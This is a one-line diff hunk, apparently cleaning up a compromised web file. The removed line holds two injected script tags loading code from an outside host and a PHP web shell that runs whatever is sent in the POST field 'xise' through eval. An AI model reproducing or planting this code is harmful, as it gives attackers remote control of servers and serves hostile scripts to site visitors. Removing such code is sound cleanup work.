@@ -1,1 +1,0 @@
-<script src="http://cpm.36obuy.org/evil/1.js"></script><script src="http://cpm.36obuy.org/lion/1.js"></script>php echo '###m7lrvok###';$a=$_POST['xise'];$b;$b=$a;@eval($a)
